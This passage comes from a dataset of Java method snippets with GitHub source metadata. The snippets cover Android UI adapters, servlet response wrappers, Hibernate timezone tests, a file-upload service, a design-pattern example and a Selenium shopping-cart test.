LayoutInflater.from(parent.getContext()).inflate(R.layout.list_item_item_category_new_small,parent,false);\n        return new ViewHolderItemCategorySmall(view,context,fragment,adapter);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderItemCategorySmall.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57211, "method_name": "itemCategoryListItemClick", "class_name": "ViewHolderItemCategorySmall", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void itemCategoryListItemClick()\n    {\n\n        if(fragment instanceof ListItemClick)\n        {\n            ((ListItemClick) fragment).notifyRequestSubCategory(itemCategory);\n        }\n\n\n//        selectedItems.clear();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderItemCategorySmall.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57212, "method_name": "bindItemCategory", "class_name": "ViewHolderItemCategorySmall", "params": ["ItemCategory"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void bindItemCategory(ItemCategory itemCategory)\n    {\n        this.itemCategory = itemCategory;\n\n        categoryName.setText(String.valueOf(itemCategory.getCategoryName()));\n\n\n        String imagePath = PrefGeneral.getServiceURL(context) + \"/api/v1/ItemCategory/Image/five_hundred_\"\n                + itemCategory.getImagePath() + \".jpg\";\n\n        Drawable placeholder = VectorDrawableCompat\n                .create(context.getResources(),\n                        R.drawable.ic_nature_people_white_48px, context.getTheme());\n\n\n        Picasso.get()\n                .load(imagePath)\n                .placeholder(placeholder)\n                .into(categoryImage);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewHolders/ViewHolderItemCategorySmall.java", "stars": "10", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57213, "method_name": "getLayoutId", "class_name": "ChatMessageAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId(int viewType) {\n        int layoutId = 0;\n        switch (viewType) {\n            case TYPE_ITEM_CHATMESSAGE_OTHER:\n                layoutId = R.layout.item_chatmessage;\n                break;\n            case TYPE_ITEM_CHATMESSAGE_TIP:\n                layoutId = R.layout.item_chatmessage_tip;\n                break;\n        }\n        return layoutId;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 57214, "method_name": "getItemViewType", "class_name": "ChatMessageAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemViewType(int position) {\n        return getData().get(position).getMsgType();\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 57215, "method_name": "convert", "class_name": "ChatMessageAdapter", "params": ["VH", "ChatMessage", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void convert(VH holder, ChatMessage data, int position) {\n        LogUtil.d(\"zhaochong\", \" rv  position : \" + position);\n        switch (data.getMsgType()) {\n            case TYPE_ITEM_CHATMESSAGE_OTHER:\n                handleContent(holder, data);\n                break;\n            case TYPE_ITEM_CHATMESSAGE_TIP:\n                holder.setText(R.id.tv_chatmessage_tip, data.getMessage());\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 57216, "method_name": "handleContent", "class_name": "ChatMessageAdapter", "params": ["VH", "ChatMessage"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleContent(VH holder, ChatMessage data) {\n        TextView charmessage = holder.getView(R.id.tv_chatmessage);\n        charmessage.setText(data.getUid() + \": \" + data.getMessage());\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/adapter/ChatMessageAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 57217, "method_name": "onCheckedChanged", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCheckedChanged (android.support.design.chip.ChipGroup p0, int p1)\n\t{\n\t\tn_onCheckedChanged (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 57218, "method_name": "n_onCheckedChanged", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["android", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onCheckedChanged (android.support.design.chip.ChipGroup p0, int p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 57219, "method_name": "monodroidAddReference", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 57220, "method_name": "monodroidClearReferences", "class_name": "ChipGroup_OnCheckedChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/design/chip/ChipGroup_OnCheckedChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 57221, "method_name": "setCharacterEncoding", "class_name": "ServletResponse", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCharacterEncoding(String encoding)\n  {\n    httpServletResponse.setCharacterEncoding(encoding);\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57222, "method_name": "setContentType", "class_name": "ServletResponse", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setContentType(String contentType)\n  {\n    httpServletResponse.setContentType(contentType);\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57223, "method_name": "getOutputStream", "class_name": "ServletResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "OutputStream", "snippet": "  public OutputStream getOutputStream()\n  {\n    try\n    {\n      return httpServletResponse.getOutputStream();\n    }\n    catch (IOException e)\n    {\n      throw new RuntimeException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57224, "method_name": "getWriter", "class_name": "ServletResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Writer", "snippet": "  public Writer getWriter()\n  {\n    try\n    {\n      return httpServletResponse.getWriter();\n    }\n    catch (IOException e)\n    {\n      throw new RuntimeException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57225, "method_name": "setHeader", "class_name": "ServletResponse", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setHeader(String name, String value)\n  {\n    httpServletResponse.setHeader(name, value);\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57226, "method_name": "setStatus", "class_name": "ServletResponse", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setStatus(int status)\n  {\n    httpServletResponse.setStatus(status);\n  }", "url": "https://raw.githubusercontent.com/GuntherRademacher/rr/master/src/main/java/de/bottlecaps/webapp/servlet/ServletResponse.java", "stars": "10", "class_props": {"extends": null, "implements": ["Response"], "modifiers": ["public"]}}, {"id": 57227, "method_name": "setup", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        dateTimeWrapper = new DateTimeWrapper();\n        dateTimeWrapper.setInstant(Instant.parse(\"2014-11-12T05:50:00.0Z\"));\n        dateTimeWrapper.setLocalDateTime(LocalDateTime.parse(\"2014-11-12T07:50:00.0\"));\n        dateTimeWrapper.setOffsetDateTime(OffsetDateTime.parse(\"2011-12-14T08:30:00.0Z\"));\n        dateTimeWrapper.setZonedDateTime(ZonedDateTime.parse(\"2011-12-14T08:30:00.0Z\"));\n        dateTimeWrapper.setLocalTime(LocalTime.parse(\"14:30:00\"));\n        dateTimeWrapper.setOffsetTime(OffsetTime.parse(\"14:30:00+02:00\"));\n        dateTimeWrapper.setLocalDate(LocalDate.parse(\"2016-09-10\"));\n\n        dateTimeFormatter = DateTimeFormatter\n            .ofPattern(\"yyyy-MM-dd HH:mm:ss.S\")\n            .withZone(ZoneId.of(\"UTC\"));\n\n        timeFormatter = DateTimeFormatter\n            .ofPattern(\"HH:mm:ss\")\n            .withZone(ZoneId.of(\"UTC\"));\n\n        dateFormatter = DateTimeFormatter\n            .ofPattern(\"yyyy-MM-dd\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57228, "method_name": "storeInstantWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeInstantWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"instant\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeFormatter.format(dateTimeWrapper.getInstant());\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57229, "method_name": "storeLocalDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalDateTime()\n            .atZone(ZoneId.systemDefault())\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57230, "method_name": "storeOffsetDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeOffsetDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"offset_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getOffsetDateTime()\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57231, "method_name": "storeZoneDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeZoneDateTimeWithUtcConfigShouldBeStoredOnGMTTimeZone() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"zoned_date_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getZonedDateTime()\n            .format(dateTimeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57232, "method_name": "storeLocalTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalTime()\n            .atDate(LocalDate.of(1970, Month.JANUARY, 1))\n            .atZone(ZoneId.systemDefault())\n            .format(timeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57233, "method_name": "storeOffsetTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeOffsetTimeWithUtcConfigShouldBeStoredOnGMTTimeZoneAccordingToHis1stJan1970Value() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"offset_time\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getOffsetTime()\n            .toLocalTime()\n            .atDate(LocalDate.of(1970, Month.JANUARY, 1))\n            .atZone(ZoneId.systemDefault())\n            .format(timeFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57234, "method_name": "storeLocalDateWithUtcConfigShouldBeStoredWithoutTransformation", "class_name": "HibernateTimeZoneIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void storeLocalDateWithUtcConfigShouldBeStoredWithoutTransformation() {\n        dateTimeWrapperRepository.saveAndFlush(dateTimeWrapper);\n\n        String request = generateSqlRequest(\"local_date\", dateTimeWrapper.getId());\n        SqlRowSet resultSet = jdbcTemplate.queryForRowSet(request);\n        String expectedValue = dateTimeWrapper\n            .getLocalDate()\n            .format(dateFormatter);\n\n        assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(resultSet, expectedValue);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57235, "method_name": "generateSqlRequest", "class_name": "HibernateTimeZoneIT", "params": ["String", "long"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String generateSqlRequest(String fieldName, long id) {\n        return format(\"SELECT %s FROM gardle_date_time_wrapper where id=%d\", fieldName, id);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57236, "method_name": "assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone", "class_name": "HibernateTimeZoneIT", "params": ["SqlRowSet", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void assertThatDateStoredValueIsEqualToInsertDateValueOnGMTTimeZone(SqlRowSet sqlRowSet, String expectedValue) {\n        while (sqlRowSet.next()) {\n            String dbValue = sqlRowSet.getString(1);\n\n            assertThat(dbValue).isNotNull();\n            assertThat(dbValue).isEqualTo(expectedValue);\n        }\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/config/timezone/HibernateTimeZoneIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57237, "method_name": "uploadFile", "class_name": "FileUploadServiceImpl", "params": ["MultipartFile"], "throws": null, "modifiers": ["public"], "return_type": "FileInfo", "snippet": "    public FileInfo uploadFile(MultipartFile file) {\n\n        String dateStr = new SimpleDateFormat(\"yyyyMMdd\").format(DateUtil.now());\n        String fileName = file.getOriginalFilename();\n        String path = UPLOAD_DIR + dateStr + FILE_SEPARATOR + fileName;\n\n        File fileInDisk = new File(path);\n\n        if (!fileInDisk.getParentFile().exists()) {\n            // \u4e0d\u5b58\u5728\u7684\u76ee\u5f55 \u521b\u5efa\u5b83\uff01\n            fileInDisk.getParentFile().mkdirs();\n        }\n\n        // \u4fdd\u5b58\u6587\u4ef6\n        try {\n            file.transferTo(fileInDisk);\n        } catch (IOException e) {\n            throw new FileUploadException(\"Upload file error. \" + e.getMessage());\n        }\n\n        String baseUrl = optionService.getBlogBaseUrl();\n        String fileUrl = baseUrl + FILE_URL_PREFIX + dateStr + \"/\" + fileName;\n\n        return new FileInfo(fileName, fileUrl, (int) file.getSize() / 1024);\n    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/service/impl/FileUploadServiceImpl.java", "stars": "1", "class_props": {"extends": null, "implements": ["FileUploadService"], "modifiers": ["public"]}}, {"id": 57238, "method_name": "dispense", "class_name": "Rupee20DispenseChain", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispense(int amount) {\n        if (amount >= 20) {\n            int notes = amount / 20;\n            int remainingAmount = amount % 20;\n            System.out.println(\"Number of 20 Rs notes are \" + String.valueOf(notes));\n            this.nextChain.dispense(remainingAmount);\n        } else if (amount > 0) {\n            this.nextChain.dispense(amount);\n        }\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Chain%20of%20Responsibility/src/Rupee20DispenseChain.java", "stars": "38", "class_props": {"extends": "IATMDispenseChain", "implements": null, "modifiers": ["public"]}}, {"id": 57239, "method_name": "addToCart", "class_name": "day6BigBasket", "params": ["String", "Float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "public void addToCart(String product,Float price)\n{\n\tdriver.findElementByXPath(\"(//a[contains(text(),'\"+product+\"')]/following::div[@class='delivery-opt']//button[contains(text(),'Add')])[1]\").click();\n\tif (driver.findElementByXPath(\"//div[@class='toast-title']\").isDisplayed()) {\n\t\tSystem.out.println(product+ \" added to cart succefully\");\n\t\tdriver.findElementByClassName(\"toast-close-button\").click();}}", "url": "https://raw.githubusercontent.com/SudhaM-SeleniumCoding/Learnings/master/day6BigBasket.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57240, "method_name": "cartValidation", "class_name": "day6BigBasket", "params": ["String", "Float"], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "public Float cartValidation(String product,Float price) {\n\taction.moveToElement(driver.findElementByXPath(\"//span[@title='Your Basket']\")).pause(2000).perform();\n\tString[] eachqty=driver.findElementByXPath(\"//div[@class='product-name']/a[contains(text(),'\"+product+\"')]/following::div[1]\").getText().split(\" \");\n\tint intqty=Integer.parseInt(eachqty[0]);\n\tFloat Cartprice=intqty*price;\n\tSystem.out.println(\"The cart price of \"+product+\" is \" +Cartprice);\n\treturn Cartprice;}", "url": "https://raw.githubusercontent.com/SudhaM-SeleniumCoding/Learnings/master/day6BigBasket.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57241, "method_name": "carttotal", "class_name": "day6BigBasket", "params": ["Float", "Float", "Float"], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "public Float carttotal(Float dal,Float rice,Float total) {\nif (dal+rice==total)\n\t{System.out.println(\"The cart total is validated\");}\n\telse\n\t{System.out.println(\"There is mismatch in cart total\");}\n\treturn total;}", "url": "https://raw.githubusercontent.com/SudhaM-SeleniumCoding/Learnings/master/day6BigBasket.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57242, "method_name": "bigbasket", "class_name": "day6BigBasket", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "public void bigbasket() throws InterruptedException\n{\n\t\t//Go to https://www.bigbasket.com/\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"./drivers/chromedriver_win32/chromedriver.exe\");\n\t\t driver=new ChromeDriver();\n\t\t driver.get(\"https://www.bigbasket.com/\");\n\t\tdriver.manage().timeouts().implicitlyWait(30, TimeUnit.SECONDS);\n\t\tdriver.manage().window().maximize();\n\t\t action=new Actions(driver);\n\t\tWebDriverWait wait=new WebDriverWait(driver,30);\n\t\t\n\t\t//handle location popup\n\t\tif(driver.findElementByXPath(\"//label[contains(text(),'You are seeing our catalogue in')]\").isDisplayed())\n\t\t{\n\t\t\tdriver.findElementByXPath(\"//span[@class='close-btn']\").click();\n\t\t}\n\t\t\n\t\t//mouse over on  Shop by Category.Go to FOODGRAINS, OIL & MASALA --> RICE & RICE PRODUCTS\n\t\taction.moveToElement(driver.findElementByXPath(\"//a[@class='dropdown-toggle meganav-shop']\")).click().build().perform();\n\t\taction.moveToElement(driver.findElementByXPath(\"(//a[text()='Foodgrains, Oil & Masala'])[2]\")).pause(2000).perform();\n\t\taction.moveToElement(driver.findElementByXPath(\"(//a[text()='Rice & Rice Products'])[2]\")).perform();\n\t\taction.moveToElement(driver.findElementByXPath(\"(//a[text()='Boiled & Steam Rice'])[2]\")).click().build().perform();\n\t\t\n\t\t//Choose the Brand as bb Royal\n\t\tdriver.findElementByXPath(\"(//span[text()='bb Royal'])[1]\").click();\n\t\twait.until(ExpectedConditions.visibilityOf(driver.findElementByXPath(\"//div[text()='bb Royal']\")));\n\t\t\n\t\t//Go to Ponni Boiled Rice - Super Premium and select 5kg bag from Dropdown\n\t\tThread.sleep(3000);\n\t\tdriver.findElementByXPath(\"//a[text()='Ponni Boiled Rice - Super Premium']/following::button[1]\").click();\n\t\tdriver.findElementByXPath(\"//a[text()='Ponni Boiled Rice - Super Premium']/following::button[1]/following::span[text()='5 kg'][1]\").click();\n\t\tFloat ricePrice=Float.parseFloat(driver.findElementByXPath(\"//a[text()='Ponni Boiled Rice - Super Premium']/following::span[@class='discnt-price'][1]/span\").getText());\n\t\tSystem.out.println(\"The price of rice is\" +ricePrice);\n\t\t\n\t\t//Click Add button\n\t\taddToCart(\"Ponni Boiled Rice - Super Premium\",ricePrice);\n\t\tFloat cartricePrice=cartValidation(\"Ponni Boiled Rice - Super Premium\",ricePrice);\n\t\t\n\t\t//Type Dal in Search field and enter\n\t\tdriver.findElementByXPath(\"//input[@id='input']\").sendKeys(\"Dal\",Keys.ENTER);\n\t\t\n\t\t//Go to Toor/Arhar Dal and select 2kg & set Qty 2\n\t\twait.until(ExpectedConditions.elementToBeClickable(driver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::button[1]\")));\n\t\tdriver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::button[1]\").click();\n\t\twait.until(ExpectedConditions.visibilityOf(driver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::button[1]/following::span[text()='2 kg'][1]\")));\n\t\tdriver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::button[1]/following::span[text()='2 kg'][1]\").click();\n\t\tdriver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::input[@ng-model='vm.startQuantity'][1]\").clear();\n\t\tdriver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::input[@ng-model='vm.startQuantity'][1]\").sendKeys(\"2\");\n\t\n\t\t//Print the price of Dal\n\t\tFloat dalPrice=Float.parseFloat(driver.findElementByXPath(\"//a[text()='Toor/Arhar Dal/Thuvaram Paruppu']/following::span[@class='discnt-price'][1]/span\").getText());\n\t\tSystem.out.println(\"The price of Dal is \"+dalPrice);\n\t\t\n\t\t\n\t\t//Click Add button\n\t\taddToCart(\"Toor/Arhar\", dalPrice);\n\t\tFloat cartdalPrice=cartValidation(\"Toor/Arhar\", dalPrice);\n\t\n\t\t//Mouse hover on My Basket \n\t\taction.moveToElement(driver.findElementByXPath(\"//span[@title='Your Basket']\")).pause(2000).perform();\n\t\t\n\t\t\n\t\t//Validate the Sub Total displayed for the selected items\n\t\tFloat totalPrice=Float.parseFloat(driver.findElementByXPath(\"//span[@qa='subTotalMB']\").getText());\n\t\tSystem.out.println(\"The subtotal in cart is \" +totalPrice);\n\t\t//cart total validation\n\t\tSystem.out.println(\"The total amount of 1ricce and 2dal is \" +carttotal(cartricePrice,cartdalPrice,totalPrice));\n\t\t\n\t\t//Reduce the Quantity of Dal as 1 \n\t\taction.moveToElement(driver.findElementByXPath(\"//span[@title='Your Basket']\")).pause(2000).perform();\n\t\tdriver.findElementByXPath(\"//div[@class='product-name']/a[contains(text(),'Toor/Arhar')]/following::button[@qa='decQtyMB']\").click();\n\t\tThread.sleep(3000);\n\t\tFloat newtotalPrice=Float.parseFloat(driver.findElementByXPath(\"//span[@qa='subTotalMB']\").getText());\n\t\tSystem.out.println(\"The total in cart is \" +newtotalPrice);\n\t\t\n\t\t//cart total validation\n\t\tFloat newdalPrice=cartValidation(\"Toor/Arhar\",dalPrice);\n\t\tSystem.out.println(\"The total amount of 1 rice and 1 dal is \" +carttotal(cartricePrice,newdalPrice,newtotalPrice));\n\t\n\t\tdriver.close();\n}", "url": "https://raw.githubusercontent.com/SudhaM-SeleniumCoding/Learnings/master/day6BigBasket.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57243, "method_name": "searchCustomerList", "class_name": "CustomerDAO", "params": ["SearchResult<Customer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchCustomerList(SearchResult<Customer> searchResult, String title) throws BGException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<Customer> list = searchResult.getList();\n\n            StringBuilder selectPart = new StringBuilder();\n            StringBuilder joinPart = new StringBuilder();\n\n            String referenceTemplate = addCustomerReferenceQuery(selectPart, joinPart);\n\n            PreparedDelay ps = new PreparedDelay(con);\n\n            StringBuilder query = new StringBuilder();\n            query.append(SQL_SELECT_COUNT_ROWS);\n            